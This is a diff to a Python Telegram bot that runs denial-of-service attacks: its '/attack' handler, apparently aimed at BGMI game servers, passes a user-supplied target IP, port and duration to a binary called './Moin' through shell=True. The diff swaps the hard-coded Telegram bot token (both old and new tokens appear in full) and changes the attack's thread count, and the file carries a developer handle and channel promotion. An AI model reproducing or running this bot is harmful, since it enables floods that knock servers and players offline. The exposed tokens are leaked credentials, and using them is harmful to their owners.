@@ -4,7 +4,7 @@ import datetime
 import os
 # KALIAYT JOIN TO MORE UPDATES 
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7194330104:AAFoGc1MYSHLxgKJ_5nyHh8dG1OYJEdFhlM')
+bot = telebot.TeleBot('7562811680:AAHCAUsS45LYVF3xeTjXg2hEBeSeswi4Ymk')
 # DEVELOPER --> @Pyschoboi 
 # Admin user IDs
 admin_id = ["930577300"]
@@ -284,7 +284,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/attack', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./Moin {target} {port} {time} 1800"
+                full_command = f"./Moin {target} {port} {time} 800"
                 subprocess.run(full_command, shell=True)
                 response = f"🔺𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗘𝗟𝗧𝗘𝗗🔻 \n\n💢𝗧𝗮𝗿𝗴𝗲𝘁 -> {target} \n💢𝗣𝗼𝗿𝘁: {port} \n💢𝗧𝗶𝗺𝗲: {time}"
         else:
